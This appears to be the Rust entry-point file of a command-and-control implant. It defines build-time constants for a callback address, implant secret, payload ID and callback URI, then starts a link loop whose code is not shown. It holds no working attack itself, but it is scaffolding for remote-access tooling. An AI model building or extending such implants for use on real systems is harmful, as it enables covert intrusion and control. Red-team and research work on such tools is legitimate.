mod stdlib;

const CALLBACK: &str = env!("CALLBACK");
const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");
const PAYLOAD_UUID: &str = env!("PAYLOAD_UUID");
const CALLBACK_URI: &str = env!("CALLBACK_URI");

fn main() {
    stdlib::link_loop();
}
